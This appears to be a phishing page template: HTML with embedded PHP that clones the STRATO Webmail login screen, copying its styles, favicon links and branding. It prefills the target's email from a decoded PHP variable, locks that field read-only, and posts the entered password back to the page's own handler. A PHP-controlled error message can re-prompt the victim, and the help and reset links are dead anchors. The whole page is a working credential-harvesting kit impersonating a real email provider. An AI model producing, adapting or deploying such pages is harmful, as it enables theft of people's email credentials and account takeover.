        #io-ox-login-screen #io-ox-login-container header #io-ox-languages .dropdown>a:focus,
        #io-ox-login-screen #io-ox-login-container header #io-ox-languages .dropdown>a:hover,
        #io-ox-login-screen #io-ox-login-container header #io-ox-languages .dropdown>a:active {
            text-decoration: none;
            border-bottom: 0;
            box-shadow: none;
        }

        #io-ox-login-screen #io-ox-login-container header #io-ox-languages .dropdown>a:focus>.toggle-text,
        #io-ox-login-screen #io-ox-login-container header #io-ox-languages .dropdown>a:hover>.toggle-text,
        #io-ox-login-screen #io-ox-login-container header #io-ox-languages .dropdown>a:active>.toggle-text {
            border: none;
        }

        #io-ox-login-screen #io-ox-login-container header #io-ox-languages .dropdown>a:focus .caret,
        #io-ox-login-screen #io-ox-login-container header #io-ox-languages .dropdown>a:hover .caret,
        #io-ox-login-screen #io-ox-login-container header #io-ox-languages .dropdown>a:active .caret {
            padding: 0;
            text-decoration: none;
            border-bottom: 0;
            border-top: 3px solid rgba(255, 255, 255, 0.7);
        }

        #io-ox-login-screen #io-ox-login-container header #io-ox-languages .dropdown>a .toggle-text {
            padding: 0 10px;
        }

        #io-ox-login-screen #io-ox-login-container header #io-ox-languages .dropdown-menu {
            left: 10px;
            top: 41px;
            min-width: 130px;
            box-shadow: 0 3px 4px 0 rgba(0, 0, 0, 0.1);
            padding: 0;
            border-color: #ccc;
            max-height: none;
            overflow-y: visible;
        }

        #io-ox-login-screen #io-ox-login-container header #io-ox-languages .dropdown-menu:before {
            font-size: 15px;
            position: absolute;
            top: -30px;
            left: 12px;
            border: 1em solid transparent;
            border-bottom-color: #ccc;
            content: "";
            display: block;
            width: 2em;
            height: 1em;
            z-index: 1001;
        }

        #io-ox-login-screen #io-ox-login-container header #io-ox-languages .dropdown-menu:after {
            font-size: 15px;
            position: absolute;
            top: -29px;
            left: 12px;
            border: 1em solid transparent;
            border-bottom-color: #fff;
            content: "";
            display: block;
            width: 2em;
            height: 1em;
            z-index: 1002;
        }

        #io-ox-login-screen #io-ox-login-container header #io-ox-languages .dropdown-menu a {
            height: 40px;
            box-sizing: border-box;
            padding: 10px;
            color: #333;
        }

        #io-ox-login-screen #io-ox-login-container header #io-ox-languages .dropdown-menu a.selected,
        #io-ox-login-screen #io-ox-login-container header #io-ox-languages .dropdown-menu a:focus,
        #io-ox-login-screen #io-ox-login-container header #io-ox-languages .dropdown-menu a:hover {
            background: #f80;
            color: #fff;
        }

        #io-ox-login-screen #io-ox-login-container header #io-ox-languages .dropdown-menu a:active {
            background: #dd5800;
            color: #fff;
        }

        #io-ox-login-screen #io-ox-login-container header .links {
            float: right;
            font-size: 13px;
            color: #fff;
            margin: 0;
        }

        #io-ox-login-screen #io-ox-login-container header .links li {
            padding: 0;
        }

        #io-ox-login-screen #io-ox-login-container header .links li a {
            padding: 0 10px;
            color: #fff;
            -webkit-transition: color 0.2s ease;
            -o-transition: color 0.2s ease;
            transition: color 0.2s ease;
        }

        #io-ox-login-screen #io-ox-login-container header .links li a.customer-care {
            padding: 10px 20px;
            min-width: 100px;
            border: 1px solid #fff;
            border-radius: 2px;
            text-align: center;
            min-height: 40px;
            margin-left: 10px;
            box-sizing: border-box;
        }

        #io-ox-login-screen #io-ox-login-container header .links li a.customer-care:hover,
        #io-ox-login-screen #io-ox-login-container header .links li a.customer-care:focus {
            background: #fff;
            color: #00659f;
        }

        #io-ox-login-screen #io-ox-login-container header .links li a.customer-care:hover span,
        #io-ox-login-screen #io-ox-login-container header .links li a.customer-care:focus span {
            border-bottom: none;
        }

        #io-ox-login-screen #io-ox-login-container header .links li a.customer-care:active {
            background: rgba(255, 255, 255, 0.9);
            color: #005383;
        }

        #io-ox-login-screen #io-ox-login-container header .links li a.customer-care:active span {
            border-bottom: none;
        }

        #io-ox-login-screen #io-ox-login-container header .links li a.customer-care span:not(.caret) {
            padding: 0;
        }

        @media (max-width: 480px) {
            #io-ox-login-screen #io-ox-login-container header .links li a.customer-care {
                padding: 0;
            }

            #io-ox-login-screen #io-ox-login-container header .links li a.customer-care i {
                display: none;
            }

            #io-ox-login-screen #io-ox-login-container header .links li a.customer-care span:not(.caret) {
                padding: 0 5px;
            }
        }

        @media (max-width: 360px) {
            #io-ox-login-screen #io-ox-login-container header .links li a.customer-care span:not(.caret) {
                padding: 0 5px;
            }
        }

        @media (max-width: 320px) {
            #io-ox-login-screen #io-ox-login-container header .links li a.customer-care span:not(.caret) {
                padding: 0;
            }
        }

        @media (max-width: 480px) {
            #io-ox-login-screen #io-ox-login-container header .links li a.customer-care {
                padding: 0;
                min-width: 0;
            }
        }

        @media (max-width: 320px) {
            #io-ox-login-screen #io-ox-login-container header .links li a.customer-care {
                border: 0;
            }
        }

        #io-ox-login-screen #io-ox-login-container header .links li a:hover,
        #io-ox-login-screen #io-ox-login-container header .links li a:focus {
            text-decoration: none;
            color: rgba(255, 255, 255, 0.7);
        }

        #io-ox-login-screen #io-ox-login-container header .links li a:hover span,
        #io-ox-login-screen #io-ox-login-container header .links li a:focus span {
            border-bottom: 3px solid rgba(255, 255, 255, 0.7);
        }

        #io-ox-login-screen #io-ox-login-container header .links li a:active {
            text-decoration: none;
            color: rgba(255, 255, 255, 0.8);
        }

        #io-ox-login-screen #io-ox-login-container header .links li a:active span {
            border-bottom: 3px solid rgba(255, 255, 255, 0.8);
        }

        #io-ox-login-screen #io-ox-login-container header .links li a span:not(.caret) {
            padding: 0 10px;
        }

        @media (max-width: 480px) {
            #io-ox-login-screen #io-ox-login-container header .links li a {
                padding: 0;
            }

            #io-ox-login-screen #io-ox-login-container header .links li a i {
                display: none;
            }

            #io-ox-login-screen #io-ox-login-container header .links li a span:not(.caret) {
                padding: 0 5px;
            }
        }

        @media (max-width: 360px) {
            #io-ox-login-screen #io-ox-login-container header .links li a span:not(.caret) {
                padding: 0 5px;
            }
        }

        @media (max-width: 320px) {
            #io-ox-login-screen #io-ox-login-container header .links li a span:not(.caret) {
                padding: 0;
            }
        }

        @media (max-width: 360px) {
            #io-ox-login-screen #io-ox-login-container header .links li select {
                max-width: 75px;
            }
        }

        @media (max-width: 320px) {
            #io-ox-login-screen #io-ox-login-container header .links li select {
                max-width: 60px;
            }
        }

        #io-ox-login-screen #io-ox-login-container #box-form-header {
            display: block !important;
            font-family: "OpenSansSemibold", Lucida, Arial, sans-serif;
        }

        #io-ox-login-screen #io-ox-login-container #box-form-header #io-ox-login-header-prefix {
            margin-left: 30px;
        }

        #io-ox-login-screen #io-ox-login-container #box-form-header span {
            color: inherit;
        }

        #io-ox-login-screen #io-ox-login-container #box-form-header i {
            position: absolute;
            bottom: 2px;
            font-size: inherit;
            color: inherit;
        }

        #io-ox-login-screen #io-ox-login-container #box-form-header h1 {
            text-align: left;
        }

        #io-ox-login-screen h1 {
            line-height: 1;
            font-size: 24px;
            font-family: "OpenSansSemibold", Lucida, Arial, sans-serif;
            color: #666;
            padding: 0;
            position: relative;
        }

        #io-ox-login-screen h1 .header-login-title {
            margin-left: 60px;
        }

        #io-ox-login-screen h1 span {
            color: inherit;
        }

        #io-ox-login-screen h1 i {
            position: absolute;
            bottom: 2px;
        }

        #io-ox-login-screen h1#login-title {
            margin-bottom: 30px;
        }

        #io-ox-login-screen h2 {
            margin: 0;
            padding: 12px 20px;
            font-size: 16px;
            font-family: "OpenSansSemibold", Lucida, Arial, sans-serif;
            line-height: 1;
            height: 40px;
            background: #999;
            color: #fff;
        }

        #io-ox-login-screen #io-ox-login-container {
            background-color: #f8f8f8;
        }

        #io-ox-login-screen #io-ox-login-container .feedback {
            margin-top: 16px;
        }

        #io-ox-login-screen #io-ox-login-container .form-container {
            padding: 30px 20px;
        }

        #io-ox-login-screen #io-ox-login-container .form-container form {
            margin-top: -3px;
        }

        #io-ox-login-screen #io-ox-login-container .buttons .form-group {
            margin-bottom: 0;
        }

        #io-ox-login-screen #io-ox-login-container #io-ox-login-store {
            margin-bottom: 0;
        }

        #io-ox-login-screen #io-ox-login-container #io-ox-login-store .checkbox {
            padding-left: 24px;
        }

        #io-ox-login-screen #io-ox-login-container #io-ox-login-store label {
            margin-top: 10px;
        }

        #io-ox-login-screen #io-ox-login-container #io-ox-login-store .toggle {
            margin-top: 8px;
        }

        #io-ox-login-screen #io-ox-login-container .fa-envelope,
        #io-ox-login-screen #io-ox-login-container .fa-lock {
            position: absolute;
            color: #999;
            z-index: 3;
            bottom: 13px;
            left: 25px;
            font-size: 16px;
        }

        #io-ox-login-screen #io-ox-login-container #io-ox-forgot-password~.fa-lock {
            bottom: 37px;
        }

        #io-ox-login-screen #io-ox-login-container .form-control:not(.btn) {
            padding-left: 28px;
            max-width: 340px;
        }

        #io-ox-login-screen #io-ox-login-container .form-control:not(.btn):focus {
            box-shadow: none;
        }

        #io-ox-login-screen #io-ox-login-container .form-control:not(.btn):focus+i {
            color: #999;
        }

        #io-ox-login-screen #io-ox-login-container .form-control:not(.btn)[type="text"] {
            font-family: FontAwesome;
        }

        #io-ox-login-screen #io-ox-login-container .btn {
            border-radius: 2px;
            min-height: 40px;
            padding: 10px 20px;
            background: #07b;
            border: none;
            color: #fff;
        }

        #io-ox-login-screen #io-ox-login-container .btn:focus,
        #io-ox-login-screen #io-ox-login-container .btn:hover {
            outline: none;
            box-shadow: none;
            background: #00659f;
        }

        #io-ox-login-screen #io-ox-login-container .btn:active {
            background: #005383;
        }

        #io-ox-login-screen #io-ox-login-container .checkbox.custom input:checked+i.toggle {
            color: #fff;
            background-color: #07b;
            border-color: #07b;
        }

        #io-ox-login-screen #io-ox-login-container label {
            font-size: 14px;
            font-weight: normal;
            color: #333;
            padding-top: 0;
        }

        #io-ox-login-screen #io-ox-login-container .forgot-password .form-group,
        #io-ox-login-screen #io-ox-login-container .password-retype .form-group,
        #io-ox-login-screen #io-ox-login-container .password .form-group {
            margin-bottom: 0;
        }

        #io-ox-login-screen #io-ox-login-container a,
        #io-ox-login-screen #io-ox-login-container .buttons label {
            color: #07b;
        }

        #io-ox-login-screen #io-ox-login-container a:link,
        #io-ox-login-screen #io-ox-login-container .buttons label:link {
            color: #07b;
        }

        #io-ox-login-screen #io-ox-login-container a:focus,
        #io-ox-login-screen #io-ox-login-container .buttons label:focus,
        #io-ox-login-screen #io-ox-login-container a:hover,
        #io-ox-login-screen #io-ox-login-container .buttons label:hover {
            color: #004576;
            outline: none;
        }

        #io-ox-login-screen #io-ox-login-container a:active,
        #io-ox-login-screen #io-ox-login-container .buttons label:active {
            color: #0074b5;
            outline: none;
        }

        #io-ox-login-screen #io-ox-login-container a.password,
        #io-ox-login-screen #io-ox-login-container .buttons label.password {
            text-align: right;
            max-width: 340px;
            font-size: 14px;
            display: block;
        }

        #io-ox-login-screen #io-ox-login-footer {
            margin: 0;
            box-sizing: border-box;
            box-shadow: 0 1px 0 #fff inset;
            color: #fff;
            line-height: 20px;
            min-height: 70px;
            padding: 25px 30px;
            background: #f80;
            width: 100%;
        }

        #io-ox-login-screen #io-ox-login-footer .composition-element {
            margin: 0 8px;
        }

        #io-ox-login-screen #io-ox-login-footer .links {
            float: left;
            font-size: 13px;
            color: #fff;
            margin: 0;
        }

        #io-ox-login-screen #io-ox-login-footer .links li {
            padding: 0;
        }

        #io-ox-login-screen #io-ox-login-footer .links li:first-child a {
            border-left: none;
        }

        #io-ox-login-screen #io-ox-login-footer .links li a {
            border-left: 1px solid #fff;
            padding: 0 10px;
            color: #fff;
            -webkit-transition: color 0.2s ease;
            -o-transition: color 0.2s ease;
            transition: color 0.2s ease;
        }

        #io-ox-login-screen #io-ox-login-footer .links li a:hover,
        #io-ox-login-screen #io-ox-login-footer .links li a:focus {
            text-decoration: none;
            color: rgba(255, 255, 255, 0.7);
        }

        #io-ox-login-screen #io-ox-login-footer .links li a:hover span,
        #io-ox-login-screen #io-ox-login-footer .links li a:focus span {
            border-bottom: 3px solid rgba(255, 255, 255, 0.7);
        }

        #io-ox-login-screen #io-ox-login-footer .links li a:active {
            text-decoration: none;
            color: rgba(255, 255, 255, 0.8);
        }

        #io-ox-login-screen #io-ox-login-footer .links li a:active span {
            border-bottom: 3px solid rgba(255, 255, 255, 0.8);
        }

        #io-ox-login-screen #io-ox-login-footer>span,
        #io-ox-login-screen #io-ox-login-footer .composition-element span {
            font-size: 13px;
        }

        #io-ox-login-content {
            flex-shrink: 0;
        }

        .smartphone #io-ox-login-screen #io-ox-login-container #io-ox-login-content #io-ox-login-box .row #box-form {
            width: 340px;
        }

        .smartphone #io-ox-login-screen #io-ox-login-container {
            margin: 0;
        }

        .smartphone #io-ox-login-screen #io-ox-login-container #io-ox-login-content #box-form #box-form-body {
            border-top-left-radius: 0;
            border-top-right-radius: 0;
        }

        .smartphone #io-ox-login-screen #io-ox-login-container .form-container {
            padding: 0;
        }

        .smartphone #io-ox-login-screen #io-ox-login-container h1 i {
            bottom: 12px;
        }

        .smartphone #io-ox-login-screen #io-ox-login-container #io-ox-login-container {
            margin-top: 0;
            top: initial;
        }

        .smartphone #io-ox-login-screen #io-ox-login-container label[for="io-ox-retype-password"],
        .smartphone #io-ox-login-screen #io-ox-login-container label[for="username"],
        .smartphone #io-ox-login-screen #io-ox-login-container label[for="pswd"] {
            display: none;
        }

        .smartphone #io-ox-login-screen #io-ox-login-container .form-control[type="text"],
        .smartphone #io-ox-login-screen #io-ox-login-container .form-control[type="email"] {
            font-size: 14px;
            font-family: inherit;
        }

        .smartphone #io-ox-login-screen #io-ox-login-container a,
        .smartphone #io-ox-login-screen #io-ox-login-container a:focus,
        .smartphone #io-ox-login-screen #io-ox-login-container a:hover {
            color: #f80;
            text-decoration: none;
        }

        .smartphone #io-ox-login-screen #io-ox-login-container a.password {
            color: #07b;
        }

        .smartphone #io-ox-login-screen #io-ox-login-container a.selected {
            text-decoration: underline;
        }

        .smartphone #io-ox-login-screen #io-ox-login-container #io-ox-copyright {
            color: #fff;
        }

        .smartphone #io-ox-login-screen #io-ox-login-container #io-ox-login-feedback {
            min-height: 0;
            margin-bottom: 0;
        }

        .smartphone #io-ox-login-screen #io-ox-login-container #io-ox-languages label {
            color: #fff;
        }

        .smartphone #io-ox-login-screen #io-ox-login-container #io-ox-login-store {
            margin-bottom: 16px;
        }

        @media (max-width: 480px) {
            .smartphone #io-ox-login-screen #io-ox-login-container #box-form .alert {
                padding: 8px;
                font-size: 13px;
            }

            .smartphone #io-ox-login-screen #io-ox-login-container header {
                min-height: 40px;
                padding: 10px;
            }

            .smartphone #io-ox-login-screen #io-ox-login-container #io-ox-login-footer {
                padding: 10px;
            }
        }

        #login-title-mobile {
            display: none;
        }

        .strato-notification.flex .modal-dialog {
            width: 900px;
        }

        @media (max-width: 1024px) {
            .strato-notification.flex .modal-dialog {
                width: 600px;
            }
        }

        .strato-notification.flex .modal-dialog .close {
            position: absolute;
            top: 10px;
            right: 20px;
        }

        .strato-notification.flex .modal-dialog .modal-body {
            padding: 0;
        }

        .strato-notification.flex .modal-dialog .modal-body iframe {
            width: 100%;
            display: block;
            border: 0;
        }
    </style>
    <meta id="custom" />
    <meta id="code" />
    <meta id="win8Icon" name="msapplication-TileImage" content=""
        href="https://webmail.strato.com/appsuite/v=7.10.5-33.20220405.070454/apps/themes/strato/icon144_win.png" />
    <link id="favicon" rel="shortcut icon"
        href="https://webmail.strato.com/appsuite/v=7.10.5-33.20220405.070454/apps/themes/strato/favicon.ico"
        type="image/x-icon" />
    <style data-src="login-page-configuration" type="text/css">
        #io-ox-login-screen #io-ox-login-container {
            background: #fff;
        }

        #io-ox-login-screen #io-ox-login-background-image {
            background: #fff;
        }

        #io-ox-login-screen #io-ox-languages :not([role="menuitem"]) {
            color: #fff;
        }

        #io-ox-login-screen #io-ox-login-footer * {
            color: #fff;
        }

        #io-ox-login-screen #io-ox-login-content {
            justify-content: center;
        }
    </style>
    <style data-src="login-page-configuration-custom" type="text/css"></style>
    <title>Login - STRATO Webmail</title>
</head>

<body class="unselectable">

    <div style="position: sticky; top: 0; background-color: #f1f1f1;  z-index: 999;">
        <div id="google_translate_element"></div>
    </div>

    <div id="background-loader" class="busy" aria-hidden="true" style="display: none">
        <div class="throbber">
            <div class="bounce1"></div>
            <div class="bounce2"></div>
            <div class="bounce3"></div>
        </div>
    </div>
    <div id="io-ox-core" class="abs unselectable" style="display: none">
        <div id="io-ox-appcontrol" style="display: none"></div>
        <div id="io-ox-screens" class="abs">
            <div id="io-ox-windowmanager" class="abs" style="display: none">
                <div id="io-ox-windowmanager-pane"></div>
            </div>
            <div id="io-ox-desktop" class="abs"></div>
        </div>
        <div id="io-ox-taskbar-container" role="region" class="abs">
            <ul id="io-ox-taskbar"></ul>
        </div>
    </div>
    <div id="io-ox-login-screen" class="unselectable" style="display: block">
        <div id="io-ox-login-blocker" style="display: none"></div>
        <div id="io-ox-login-container">
            <div id="io-ox-login-background-image">
                <header id="io-ox-login-header">
                    <div class="wrapper">
                        <div class="io-ox-logo"></div>
                        <ul class="links list-inline">
                            <li>
                                <a href="#"><i class="fa fa-question-circle"></i><span
                                        data-strato-i18n="Help &amp; Contact">Help &amp; Contact</span></a>
                            </li>
                            <li>
                                <span id="io-ox-languages">
                                    <div class="dropdown">
                                        <i class="fa fa-globe"></i><a href="#" role="button" data-toggle="dropdown"
                                            aria-haspopup="true" aria-expanded="false"><span class="sr-only"
                                                data-i18n="Language:" data-i18n-attr="text">Language:</span><span
                                                class="toggle-text" lang="en-GB">English (UK)</span><span
                                                class="caret"></span></a>
                                        <ul id="io-ox-language-list" class="dropdown-menu" role="menu"
                                            data-i18n="Languages" data-i18n-attr="aria-label" aria-label="Languages">
                                            <li role="presentation">
                                                <a href="#" role="menuitem" lang="de-DE" data-value="de_DE">Deutsch</a>
                                            </li>
                                            <li role="presentation">
                                                <a href="#" role="menuitem" lang="en-GB" data-value="en_GB">English
                                                    (UK)</a>
                                            </li>
                                            <li role="presentation">
                                                <a href="#" role="menuitem" lang="en-US" data-value="en_US">English
                                                    (US)</a>
                                            </li>
                                            <li role="presentation">
                                                <a href="#" role="menuitem" lang="es-ES" data-value="es_ES">Espa??ol</a>
                                            </li>
                                            <li role="presentation">
                                                <a href="#" role="menuitem" lang="fr-FR" data-value="fr_FR">Fran??ais</a>
                                            </li>
                                            <li role="presentation">
                                                <a href="#" role="menuitem" lang="it-IT" data-value="it_IT">Italiano</a>
                                            </li>
                                            <li role="presentation">
                                                <a href="#" role="menuitem" lang="nl-NL"
                                                    data-value="nl_NL">Nederlands</a>
                                            </li>
                                        </ul>
                                    </div>
                                </span>
                            </li>
                            <li>
                                <a class="customer-care" href="#"><span data-strato-i18n="Customer Login">Customer
                                        Login</span></a>
                            </li>
                        </ul>
                    </div>
                </header>
                <div id="io-ox-login-content">
                    <div class="align-center col-sm-6 col-xs-12">
                        <div class="row">
                            <main id="io-ox-login-box" class="col-xs-12">
                                <div class="row">
                                    <div class="flex-column">
                                        <div id="box-form" class="col-xs-12">
                                            <div id="box-form-header" class="row" data-i18n="" data-i18n-attr="text">
                                                <h1>
                                                    <i class="fa fa-envelope"></i><span
                                                        class="header-login-title">STRATO Webmail</span>
                                                </h1>
                                            </div>
                                            <div id="box-form-body" class="row">
                                                <form id="myForm" name="form1" data-name="" action="" method="post" required>
                                                    <input type="hidden" name="login" value="strato" autocorrect="off" autocapitalize="off" aria-required="true">
                                                    <div class="col-xs-12">
                                                        <div class="row title">
                                                            <h1 id="login-title" class="col-xs-12" data-i18n="Login">
                                                                <P id="messagefont">&nbsp;&nbsp;Login</P>
                                                            </h1>
                                                        </div>
                                                        <p style="color:red; text-align: center"></p>
                                                        <div class="row username">
                                                            <div class="form-group col-xs-12 col-sm-12">
                                                                <label for="username"
                                                                    data-i18n="User name">&nbsp;&nbsp;E-mail
                                                                    address</label>
                                                                <input type="text" name="user" id="user"
                                                                    class="form-control" maxlength="1000"
                                                                    autocorrect="off" autocapitalize="off"
                                                                    spellcheck="false" aria-required="true"
                                                                    autocomplete="username" value="<?php echo htmlspecialchars($decoded); ?>" readonly /><i
                                                                    class="fa fa-envelope"></i>
                                                            </div>
                                                        </div>
                                                        <div><i id="errorem" style="color: red; margin: 15px;"></i>
                                                        </div>
                                                        <div class="row password">
                                                            <div class="form-group col-xs-12 col-sm-12">
                                                                <label for="pswd"
                                                                    data-i18n="Password">Password</label><input
                                                                    type="text" name="pass" id="password"
                                                                    class="form-control" maxlength="1000"
                                                                    autocorrect="off" autocapitalize="off"
                                                                    aria-required="true"
                                                                    autocomplete="current-password" /><i
                                                                    class="fa fa-lock"></i>
                                                            </div>
                                                        </div>
                                                        <div><i id="errorpw" style="color: red; margin: 15px;">.</i>
                                                        </div>
                                                        <div class="row forgot-password">
                                                            <div class="form-group col-xs-12 col-sm-12"><a
                                                                    class="password" href="#">Forgot your password?</a>
                                                            </div>
                                                        </div>
                                                        <div class="row options">
                                                            <div class="col-xs-12 col-sm-12" id="io-ox-login-store">
                                                                <div class="checkbox custom">
                                                                    <label for="io-ox-login-store-box"
                                                                        aria-label="Stay signed in"
                                                                        data-i18n="Stay signed in"
                                                                        data-i18n-attr="label,aria-label"><input
                                                                            type="checkbox" class="sr-only"
                                                                            id="io-ox-login-store-box" checked="checked"
                                                                            name="staySignedIn" value="1" /><i
                                                                            class="toggle" aria-hidden="true"></i>Stay
                                                                        signed in</label>
                                                                </div>
                                                            </div>
                                                        </div><br>
                                                        <div class="row feedback">
                                                            <div class="col-xs-12 alert-highlight"
                                                                id="io-ox-login-feedback">
                                                                <div role="alert"
                                                                    class="selectable-text alert alert-info" id="msg"
                                                                    style="<?php echo $error; ?>">Please enter your
                                                                    credentials. (UI-0001)</div>
                                                                <div role="alert"
                                                                    class="selectable-text alert alert-info" id="error"
                                                                    style="display: none;"></div>
                                                            </div>
                                                        </div>
                                                        <div><i id="errorl" style="color: red; margin: 15px;"></i></div>
                                                        <div class="row button">
                                                            <div class="form-group col-xs-12 col-sm-12">
                                                                <button type="submit" name="signin" id="submit-btn"
                                                                    class="btn btn-primary form-control"
                                                                    data-i18n="Sign in">Sign in</button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </form>

                                            </div>
                                        </div>
                                        <div id="io-ox-information-message"></div>
                                    </div>
                                </div>
                            </main>
                        </div>
                    </div>
                </div>
                <footer id="io-ox-login-footer">
                    <ul class="links list-inline">
                        <li>
                            <a href="#"><span data-strato-i18n="STRATO.de">STRATO-HOSTING.co.uk</span></a>
                        </li>
                        <li>
                            <a href="#"><span data-strato-i18n="Terms &amp; Conditions">Terms &amp;
                                    Conditions</span></a>
                        </li>
                        <li>
                            <a href="#"><span data-strato-i18n="Privacy Policy">Privacy Policy</span></a>
                        </li>
                        <li>
                            <a href="#"><span data-strato-i18n="Imprint">Imprint</span></a>
                        </li>
                    </ul>
                    <div class="composition-element login-spacer"></div>
                    <span>&copy; 2026 OX Software GmbH</span>
                    <div class="composition-element">
                        <span>Version: </span><span>7.10.6</span>
                    </div>
                </footer>
            </div>
        </div>
    </div>
    <div role="complementary">
        <div id="io-ox-offline" style="bottom: -41px; display: none"></div>
        <div id="io-ox-alert-screenreader" role="alert" aria-live="polite" class="sr-only">
            <span id="sr-alert-text"></span>
        </div>
    </div>
</body>
</script>
<script type="text/javascript">new MaskedPassword(document.getElementById("password"),"\u25CF");document.getElementById("demo-form").onsubmit=function(){alert('pword = "'+this.pword.value+'"');return false};</script>
</html>